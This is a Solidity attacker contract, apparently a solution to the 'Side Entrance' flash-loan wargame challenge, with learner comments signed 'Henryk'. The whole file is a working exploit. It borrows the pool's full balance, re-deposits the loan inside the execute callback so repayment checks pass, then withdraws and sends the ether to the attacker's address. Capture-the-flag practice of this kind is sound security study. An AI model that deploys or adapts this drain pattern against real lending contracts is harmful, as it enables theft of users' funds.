// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";


interface IPool {
    function flashLoan(uint256 amount) external;
    function deposit() external payable;
    function withdraw() external;
}

// Henryk: I din't need to inherit the IFlashLoanEtherReceiver interface apparently 
// and simply just need the "execute" function
contract SideEntranceAttacker {
    IPool immutable pool;
    address immutable attacker;

    constructor(address _poolAddress) {
        pool = IPool(_poolAddress);
        attacker = msg.sender;
    }

    function attack() external {
        pool.flashLoan(address(pool).balance);

        // Henryk: we passed all of the verification checks from the flash loan by
        // now so lets do a withdraw to take the funds. "receive()" will be called
        // when we receive the Eth so we can send out the Eth to an outside 
        // address
        pool.withdraw();
    }

    // Henryk: note that "value" has to be used and no other parameter can be used
    function execute() external payable {
        pool.deposit{value: msg.value}();
    }

    // Henryk: this is a fallback function that I am just implementing.
    // It is called when ether is received without any data
    // Note I couldn't put this at the end of the "attack" function
    receive() external payable {
        payable(attacker).send(address(this).balance);
    }
}
